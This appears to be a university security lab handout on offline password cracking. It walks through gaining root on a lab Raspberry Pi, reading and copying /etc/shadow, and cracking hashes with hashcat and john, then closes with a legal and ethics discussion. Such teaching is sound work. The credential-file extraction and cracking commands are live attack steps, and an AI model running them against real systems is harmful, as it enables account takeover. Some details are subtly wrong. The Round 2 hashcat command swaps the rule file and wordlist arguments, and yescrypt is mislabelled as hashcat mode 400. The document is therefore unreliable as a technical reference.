In Lab 1 you used hydra to crack `labuser`'s password by hammering the SSH
service directly over the network. This is an **online** attack -- it requires
the target to be reachable and generates a lot of noisy, detectable traffic.

Real attackers often cannot, or prefer not to, work this way. A more powerful
approach is to obtain the **password hash** -- the stored, encrypted form of
the password -- and crack it locally on your own machine with no further
contact with the target. This is an **offline** attack. It is silent, limited
only by your hardware, and can be run at leisure.

This lab covers how to locate and extract the hash, understand its structure,
and crack it using two different tools: **hashcat** and **john**.

# Gaining Access and Finding the Shadow File {#sec-access}

At the end of Lab 1 you had a shell on the Pi as `labuser`. To read the
password hashes we need **root** access. If your session has timed out,
reconnect and escalate:

```sh
ssh labuser@10.7.7.200    # password from Lab 1
sudo -i                 # escalate to root (labuser has sudo rights on this Pi)
```

You should now have a root shell:

```default
root@raspberrypi:~#
```

## Locating the Shadow File with find

On Linux, password hashes are stored in `/etc/shadow`. You could navigate
there directly -- but let's use this as an opportunity to practise `find`,
a tool that becomes indispensable once you have access to an unfamiliar
system and need to locate specific files.

`find` searches the filesystem recursively from a starting point. The basic
syntax is:

```sh
find <where to search> <what to look for>
```

Search the entire filesystem for any file named `shadow`:

```sh
find / -name "shadow" 2>/dev/null
```

The `2>/dev/null` suppresses permission error messages for directories root
cannot read. You should see `/etc/shadow` in the results, confirming its
location.

You can narrow the search in many ways. Some useful flags:

| Flag | Example | Meaning |
|---|---|---|
| `-name` | `-name "shadow"` | Match exact filename |
| `-name` | `-name "*.conf"` | Match by wildcard |
| `-type f` | `-type f` | Files only (not directories) |
| `-type d` | `-type d` | Directories only |
| `-user` | `-user labuser` | Files owned by a specific user |
| `-perm` | `-perm /4000` | Files with the SUID bit set |

For example, to find all configuration files under `/etc`:

```sh
find /etc -name "*.conf" -type f 2>/dev/null
```

Or to find files owned by `labuser`:

```sh
find / -user labuser -type f 2>/dev/null
```

:::{.callout-tip}
`find / -perm /4000` is a classic post-exploitation command -- it locates
every SUID binary on the system. SUID files run with the file owner's
privileges regardless of who executes them, and misconfigured SUID
binaries are a common privilege escalation path.
:::

## Extracting the Hash with grep

Once you know the shadow file is at `/etc/shadow`, read the entire file:

```sh
cat /etc/shadow
```

The output will have one line per user. Most will be system accounts with
a `*` or `!` in the password field (meaning no valid password is set).
Find `labuser`'s entry with `grep`:

```sh
grep "labuser" /etc/shadow
```

You will see something like:

```default
labuser:$6$rT5Kv1oZ$Xe8...long hash.../:19900:0:99999:7:::
```

Save just the hash line to a file on your **own machine** (not the Pi) for
cracking. The easiest way is to copy and paste it, or use `scp` from your
machine:

```sh
# Run this on YOUR machine, not the Pi
scp labuser@10.7.7.200:/etc/shadow ./shadow_copy.txt
# Or just copy-paste the labuser line into a new file:
echo 'labuser:$6$rT5Kv1oZ$Xe8...' > shadow_copy.txt
```

# Understanding the Shadow File Format {#sec-format}

Before cracking anything it is worth understanding exactly what you are
looking at. A shadow file entry has nine colon-separated fields:

```default
labuser : $6$rT5Kv1oZ$Xe8... : 19900 : 0 : 99999 : 7 : : : :
   1           2                  3     4     5     6   7  8  9
```

| Field | Content | Meaning |
|:---:|---|---|
| 1 | `labuser` | Username |
| 2 | `$6$rT5Kv1oZ$Xe8...` | Password hash (see below) |
| 3 | `19900` | Days since epoch when password was last changed |
| 4 | `0` | Minimum days before password can be changed |
| 5 | `99999` | Maximum days before password must be changed |
| 6 | `7` | Days of warning before expiry |
| 7 | | Days after expiry before account is disabled (empty = never) |
| 8 | | Account expiry date (empty = never) |
| 9 | | Reserved |

## Anatomy of the Hash Field

The password hash field (field 2) is itself structured:

```default
$6 $ rT5Kv1oZ $ Xe8vQ2...long string...
 |       |              |
 |       |              +-- the actual hash
 |       +----------------- the salt
 +------------------------- the algorithm ID
```

| Algorithm ID | Algorithm | hashcat Mode |
|:---:|---|:---:|
| `$1$` | MD5-crypt | 500 |
| `$5$` | SHA-256-crypt | 7400 |
| `$6$` | SHA-512-crypt | 1800 |
| `$y$` | yescrypt | 400 |
| `$2y$` or `$2b$` | bcrypt | 3200 |

The **salt** is a random string added to the password before hashing. Two
users with the same password will have completely different hashes because
their salts differ. This prevents an attacker from pre-computing a table of
all possible hashes (a **rainbow table**) and looking up the result directly.

:::{.callout-note}
The `$6$` prefix tells you immediately which hashcat mode to use. This is
the single most important thing to identify before running any cracking tool.
When you encounter an unknown hash, look at the prefix -- or use a tool
like `hashid` or `hash-identifier` to help determine the type.
:::

# Cracking with hashcat {#sec-hashcat}

**hashcat** is the fastest widely-available password cracker. It can use
your GPU for massively parallel cracking -- modern graphics cards can test
billions of password candidates per second against weaker hash types.

## Installation

```sh
sudo apt install hashcat -y
```

## Preparing the Hash File

hashcat expects the raw hash, not the full shadow line. Extract just the
hash field (the second colon-separated field) and save it:

```sh
# The hash is everything between the first and second colon after the username
# Copy just the $6$salt$hash portion:
echo '$6$rT5Kv1oZ$Xe8...' > hash.txt
```

Verify the file contains only the hash and nothing else:

```sh
cat hash.txt
```

## hashcat Attack Modes

Before running a crack, it helps to understand hashcat's attack modes:

| Mode (`-a`) | Name | Description |
|:---:|---|---|
| `0` | Dictionary | Try every word in a wordlist |
| `1` | Combination | Combine words from two wordlists |
| `3` | Brute-force | Try every combination of characters up to a length |
| `6` | Hybrid wordlist + mask | Wordlist words with appended patterns |
| `7` | Hybrid mask + wordlist | Patterns with appended wordlist words |

For cracking Linux shadow hashes with a wordlist, mode `0` is the right
starting point.

## Common hashcat Hash Modes

The `-m` flag tells hashcat what type of hash it is dealing with. Here are
the most commonly encountered types:

| Mode (`-m`) | Hash Type | Where you find it |
|:---:|---|---|
| `0` | MD5 (raw) | Old web apps, legacy databases |
| `100` | SHA-1 (raw) | Git commits, older web apps |
| `1000` | NTLM | Windows password hashes |
| `1800` | sha512crypt `$6$` | Modern Linux `/etc/shadow` |
| `400` | yescrypt `$y$` | Newer Linux `/etc/shadow` |
| `500` | md5crypt `$1$` | Older Linux `/etc/shadow` |
| `3200` | bcrypt `$2*$` | Modern web app password storage |
| `5600` | NetNTLMv2 | Windows network authentication |
| `7400` | sha256crypt `$5$` | Some Linux systems |

:::{.callout-tip}
**How to identify a hash type you don't recognise:**

1. Look at the prefix -- `$6$`, `$2b$`, etc. are reliable identifiers.
2. Check the length -- raw MD5 is always 32 hex characters, SHA-1 is 40,
   SHA-256 is 64.
3. Use `hashid` or `hash-identifier`:
```sh
sudo apt install hashid -y
hashid '$6$rT5Kv1oZ$Xe8...'
```
:::

## Running a Dictionary Attack

```sh
sudo hashcat -a 0 -m 1800 hash.txt /usr/share/wordlists/rockyou.txt
```

Flag breakdown:

| Flag | Meaning |
|---|---|
| `-a 0` | Dictionary attack mode |
| `-m 1800` | Hash type: sha512crypt (Linux `$6$`) |
| `hash.txt` | File containing the hash to crack |
| `rockyou.txt` | The password wordlist |

Watch the status output. hashcat will report its speed (hashes per second)
and its progress through the wordlist. When it finds a match:

```default
$6$rT5Kv1oZ$Xe8...:sunshine1
```

The cracked password appears after the colon.

## Going Further: Rule-Based Attacks

A pure dictionary attack only tries words exactly as they appear in the
wordlist. Many users slightly modify a dictionary word -- capitalising the
first letter, appending a number, substituting `@` for `a`. **Rules** apply
these transformations automatically to every word in the wordlist, greatly
expanding coverage without needing a larger wordlist.

hashcat ships with several pre-built rule files:

```sh
ls /usr/share/hashcat/rules/
```

The `best64.rule` file applies 64 of the most common real-world password
mutations:

```sh
sudo hashcat -a 0 -m 1800 -r /usr/share/hashcat/rules/best64.rule \
    hash.txt /usr/share/wordlists/rockyou.txt
```

:::{.callout-note}
hashcat caches cracked passwords in a **potfile** (`~/.hashcat/hashcat.potfile`).
If you try to crack a hash you have already cracked, hashcat will say
`All hashes found in potfile` and skip it. Use `--show` to display cached
results:

```sh
hashcat -m 1800 hash.txt --show
```

Or clear the potfile if you want to crack from scratch:

```sh
hashcat --potfile-disable -a 0 -m 1800 hash.txt rockyou.txt
```
:::

# Cracking with john {#sec-john}

**John the Ripper** (usually just called `john`) is the other major
password-cracking tool. Where hashcat is optimised for raw speed using GPU
acceleration, john is more beginner-friendly, has automatic hash type
detection, and handles the full shadow file format directly via a companion
tool called `unshadow`.

## Installation

```sh
sudo apt install john -y
```

## Preparing the File with unshadow

john is designed to work with the `/etc/passwd` and `/etc/shadow` files
together. The `unshadow` utility merges them into a single file in the
format john expects:

```sh
unshadow /etc/passwd /etc/shadow > unshadowed.txt
```

If you are working from a copy rather than directly on the Pi, pass the
copies instead:

```sh
unshadow passwd_copy.txt shadow_copy.txt > unshadowed.txt
```

Have a look at the result:

```sh
cat unshadowed.txt
```

You will see lines like:

```default
labuser:$6$rT5Kv1oZ$Xe8...:1001:1001:,,,:/home/labuser:/bin/bash
```

The hash is now embedded in a format john understands directly.

## Running a Dictionary Attack

```sh
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
```

john will auto-detect the hash type from the `$6$` prefix and begin
cracking. Its output looks like:

```default
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
sunshine1        (labuser)
```

## Displaying Cracked Passwords

Once john has cracked a password it stores it in its own session file.
Retrieve cracked passwords at any time with:

```sh
john --show unshadowed.txt
```

Output:

```default
labuser:sunshine1:1001:1001:,,,:/home/labuser:/bin/bash

1 password hash cracked, 0 left
```

## hashcat vs john

Having used both tools, here is a practical comparison:

| | hashcat | john |
|---|---|---|
| **Speed** | Faster (GPU-accelerated) | Slower (CPU by default) |
| **Hash detection** | Manual (`-m` flag required) | Automatic from hash prefix |
| **Shadow file** | Needs hash extracted manually | Works via `unshadow` directly |
| **Rules** | Extensive built-in rule sets | Good built-in rules (`--rules`) |
| **Best for** | Raw cracking speed, GPU rigs | Ease of use, quick testing |

For the hashes you will encounter in challenges, either tool will work.
hashcat is the industry standard for speed; john is often faster to get
started with when you do not know the hash type.

# Cracking All Users {#sec-allusers}

So far you have cracked `labuser`'s hash -- but the shadow file contains
entries for three other accounts: `alice`, `bob`, and `carol`. Each one
requires a slightly different approach, giving you a chance to apply
everything covered in this lab.

## Extract All Four Hashes

First, pull all four relevant entries from the shadow file and save them
to a single file. On the Pi as root:

```sh
grep -E "^labuser:|^alice:|^bob:|^carol:" /etc/shadow > all_hashes.txt
```

Copy this file back to your own machine:

```sh
# Run on YOUR machine
scp labuser@10.7.7.200:/root/all_hashes.txt .
```

Inspect what you have:

```sh
cat all_hashes.txt
```

You should see four lines, one per user, each with a `$6$` hash.

## Prepare for hashcat

hashcat works on raw hashes rather than full shadow lines. Extract just
the hash fields into a second file:

```sh
cut -d: -f2 all_hashes.txt > hashes_only.txt
cat hashes_only.txt   # should show four $6$... strings, one per line
```

## Round 1 -- Dictionary Attack on All Hashes

Run a single dictionary attack against all four hashes at once. hashcat
handles multiple hashes in one file automatically:

```sh
sudo hashcat -a 0 -m 1800 hashes_only.txt /usr/share/wordlists/rockyou.txt
```

Watch the output. You should see `alice`, `labuser`, and `carol` crack
relatively quickly. `bob`'s hash will likely remain uncracked -- the
password `Passw0rd` does not appear in rockyou verbatim.

Check what has been cracked so far:

```sh
sudo hashcat -m 1800 hashes_only.txt --show
```

:::{.callout-note}
hashcat prints the cracked result as `hash:password`. To identify *which
user* a hash belongs to, compare the hash string against the entries in
`all_hashes.txt`. The Go script at the end of this lab automates exactly
this matching step.
:::

## Round 2 -- Rule-Based Attack for bob

`bob`'s password is a common word with character substitutions and
capitalisation -- exactly what `best64.rule` is designed to handle.
Run the rule-based attack against only the remaining uncracked hash:

```sh
sudo hashcat -a 0 -m 1800 -r /usr/share/wordlists/rockyou.txt \
    /usr/share/hashcat/rules/best64.rule hashes_only.txt
```

:::{.callout-tip}
If you want to target only `bob`'s hash rather than re-running across all
four, extract just his line first:

```sh
grep "^bob:" all_hashes.txt | cut -d: -f2 > bob_hash.txt
sudo hashcat -a 0 -m 1800 -r /usr/share/hashcat/rules/best64.rule \
    bob_hash.txt /usr/share/wordlists/rockyou.txt
```
:::

Once cracked, run `--show` again to confirm all four passwords are now
recovered:

```sh
sudo hashcat -m 1800 hashes_only.txt --show
```

## Repeat with john

Prepare the unshadowed file for all four users and run john against it:

```sh
# On the Pi as root -- grab both passwd and shadow entries for our users
grep -E "^labuser:|^alice:|^bob:|^carol:" /etc/passwd > lab_passwd.txt
grep -E "^labuser:|^alice:|^bob:|^carol:" /etc/shadow > lab_shadow.txt

# Copy both files back to your machine, then:
unshadow lab_passwd.txt lab_shadow.txt > unshadowed_all.txt
```

Dictionary attack first:

```sh
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed_all.txt
```

Then apply rules to catch `bob`:

```sh
john --wordlist=/usr/share/wordlists/rockyou.txt --rules=best64 \
    unshadowed_all.txt
```

Display all cracked passwords:

```sh
john --show unshadowed_all.txt
```

You should see all four users listed with their recovered passwords.

:::{.callout-note title="Something to think about"}
`bob` used a password that felt strong -- mixed case, letter-to-number
substitution, no obvious dictionary word. Yet it fell to a rule-based
attack in seconds. This is why security guidelines have moved away from
"complexity rules" (must contain uppercase, number, symbol) toward
**length and randomness**. A short complex password is far weaker than a
long random passphrase against a rule-aware offline attack.
:::

# Legal and Ethical Considerations {#sec-legal}

You have now used tools that can discover networked systems, attack live
services, and crack stored credentials. Before these labs, these were
abstract concepts. They are no longer. This section is about where the
legal and ethical lines sit -- and, more importantly, where they are
genuinely unclear.

## Clearly Legal

**Using these tools on infrastructure you own and control.** Everything
done in these two labs falls here. The LAN is isolated, the Pi was set up
for this purpose, and you had explicit authorisation. This is the correct
model for any legitimate security testing.

**Defensive use on your own systems.** Running nmap against your own
servers to find what an attacker would see, or running hashcat against
your own shadow file to identify weak passwords before an attacker does,
is entirely legal and professionally encouraged.

**Authorised penetration testing.** A signed contract or written statement
of work from a system owner transforms these same actions from crimes into
legitimate professional work. The document is everything -- it defines the
scope, the timeframe, and the methods permitted. Without it, there is no
protection.

**CTF competitions.** Capture the Flag events are explicitly scoped
sandboxes. Everything within the declared scope is fair game by design.

## Clearly Illegal

**Running any of these tools against systems you do not own and have not
been explicitly authorised to test.** This is the Computer Fraud and Abuse
Act (CFAA) in the US, the Computer Misuse Act (CMA) in the UK, and
equivalent legislation in virtually every other jurisdiction. The dividing
line is authorisation -- not whether you cause damage, not whether you
succeed, not whether anyone notices.

**Cracking hashes obtained without authorisation.** Possessing and
cracking a shadow file you did not have permission to access is a separate
offence from the original breach. The offline nature of the attack does
not make it victimless.

**Using these tools on university infrastructure without written approval.**
Being a student on a network does not grant you the right to scan or probe
it. Most universities' acceptable use policies explicitly prohibit
unauthorised scanning. The right move is always to ask IT in writing first.

## The Grey Areas

These are the cases where professionals genuinely disagree, and where
well-intentioned people have faced prosecution. They are worth taking
seriously.

**"I own the device but not the network."**
Running nmap from your laptop on a university or coffee shop WiFi scans
infrastructure you do not own. The fact that you own the scanning machine
is irrelevant. The traffic touches routers, switches, and other devices
you have no authority over.

**"The system was publicly accessible."**
A web server being publicly reachable does not authorise you to probe it
for vulnerabilities or attempt to log in. Leaving a door unlocked is not
an invitation to enter -- this defence has been tested in court and has
not held up.

**"I found a vulnerability and reported it responsibly."**
Bug bounty programmes and responsible disclosure frameworks exist to
create a legal space for exactly this. Without a published programme or
prior written permission, finding and reporting a vulnerability in someone
else's system is legally risky even if morally praiseworthy. Some
researchers have faced prosecution despite acting in good faith. Check for
a programme before touching anything.

**"It was just a scan -- I didn't do anything."**
An nmap scan is not passive observation. It sends packets to systems you
do not own. Courts in multiple jurisdictions have found that unauthorised
scanning alone, without any further exploitation, can constitute an
offence under computer misuse laws.

**"I cracked the hash -- I never actually logged in."**
The act of cracking a hash obtained without permission is itself an
offence, separate from and in addition to whatever access was used to
obtain it.

## The Professional Standard

The security industry operates on one principle above all others:
**get it in writing**. A penetration tester with a signed statement of
work authorising them to test `10.7.7.0/24` between specific dates is
completely protected doing things that would otherwise carry a prison
sentence. The same person running the same tools one subnet over, or one
day later, is not.

This is also why this lab used an isolated LAN with a dedicated victim
machine -- not just for technical cleanliness, but to model the correct
professional behaviour: define your scope, stay inside it, document what
you did, and clean up afterwards.

## Discussion

Take a few minutes to discuss the following questions with your group.
There are no clean answers to most of them -- that is the point.

:::{.callout-note title="Group Discussion"}
1. You are browsing a website you use regularly and notice that changing
   a number in the URL exposes another user's personal data. You did not
   go looking for this -- you stumbled across it. What are your
   obligations? What are your legal risks if you investigate further?

2. A company publishes a bug bounty programme covering "all web
   applications." While testing their login page you discover a
   vulnerability in their VPN concentrator -- a different system entirely.
   Are you covered by the programme? What should you do?

3. Your employer asks you to test a client's network. The client gave
   verbal approval in a meeting but nothing is in writing yet. Your
   manager says to go ahead. Do you? What are the risks to you personally
   if something goes wrong?

4. You are a penetration tester on an authorised engagement. While
   working inside the target network you find evidence that a third party
   has already compromised the system and is actively exfiltrating data.
   What are your legal and ethical obligations? Who do you tell, and in
   what order?
:::
